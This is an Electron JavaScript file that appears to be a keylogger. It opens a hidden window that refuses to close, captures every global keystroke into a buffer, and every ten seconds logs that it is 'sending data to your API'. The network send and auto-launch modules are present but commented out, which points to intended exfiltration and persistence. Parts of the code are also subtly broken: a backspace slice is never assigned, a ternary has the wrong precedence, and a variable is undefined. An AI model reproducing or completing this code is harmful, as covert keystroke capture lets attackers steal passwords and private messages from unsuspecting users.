const { app, BrowserWindow } = require('electron')
const { GlobalKeyboardListener } = require('node-global-key-listener')
const v = new GlobalKeyboardListener();
// const gkm = require('gkm');
// const sendPack = require('./sendPack');

// const autoLaunch = require('./autoLaunch');
// const ioHook = require('iohook');

const key = {

	'RETURN': '\n',
	'LEFT TAB': '',
	'LEFT TAB': '',
	'SPACE': ' ',
	'LEFT CTRL': '',
};

var logger = '';

function createWindow () {
	const win = new BrowserWindow()
	win.hide()

	win.on('close', e => {
		e.preventDefault() // Prevents quit
		win.hide()
	})

	v.addListener(function (e) {


		if (e.state == "DOWN") {
			console.log(
				`${e.name}`
			);
			if (e.name == "BACKSPACE") {
				if (logger.length)
					logger.slice(0, logger.length - 1);
			}
			else {
				logger = logger +  key[e.name] ? key[e.name] : e.name
			}

		}
	});



	setInterval(function () {
		console.log('Sending data to your API...', logger);
		// sendPack(logger);
	}, 10000);

}


app.on('ready', createWindow)

app.on('activate', () => { win.show() })
//